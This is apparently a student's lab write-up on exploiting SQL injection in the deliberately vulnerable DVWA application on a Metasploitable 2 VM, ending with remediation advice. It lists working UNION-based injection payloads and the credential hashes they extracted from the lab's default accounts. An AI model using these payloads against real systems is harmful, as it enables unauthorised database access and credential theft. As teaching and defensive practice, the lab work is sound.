# Lab 2: Web Appplication Exploitation (Port 80)

**Target:** Metasploitable 2 VM
**IP Address:** 192.168.10.100
**Service:** Apache http 2.2.8
**Tools:** Web Browser, Burp Suite (Proxy)

---

## 1. Initial Reconnaissance

### A. Target Identification

* Accessed http://192.168.10.199 and navigated to the DVWA application
* Logged in using default credentials: 'admin' / 'password'
* Set DVWA Security Level to Low for initial testing.

---

## 2. Exploitation: SQL Injection (Low Security)

### A. Vulnerability Confirmation
* **Payload:** `'` (Single Quote)
* **Result:** Application returned a database error, confirming vulnerability to SQL injection and revealing the internal database error handler

## B. Column Count Determination (Methodical Troubleshooting)

Initial attemps to determine the column count using 'ORDER BY' and simple 'UNION SELECT NULL" failed due to syntax or error supression. The following methodical test was used:

1. **Test Payload:** `-1' UNION SELECT 'a', 'b' -- ` (Note the space after `--` to fix syntax errors.)
2. **Result:** The applicaiton successfully processed the query and printed the injected values: `First name: a`, `Surname: b`.
3. **Conclusion:** The original SELECT statement retrives exactly **two** columns.

###C. Data Extraction (Final Payload)

The final payload was constructed using the confirmed two-column count to extract data from the `users` table.

* **Final Payload:** `-1' UNION SELECT user, password FROM users -- `
* **Result:** Successfully executed the UNION query and retrieved all credentials.

| User | Password Hash (MD5) |
| :--- | :--- |
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |

---

## 3. Mitigation/Remediation

The SQL Injection vulnerability occurred because user input was concatenated directly into the database query string.

* **Primary Fix:** Implement **Prepared Statements** (also known as Parameterized Queries) in the application code. This forces the database driver to treat user input purely as data, never as executable code.
* **Secondary Fix:** Disable or limit verbose database error messages to prevent attackers from gaining information about the query structure and database version.
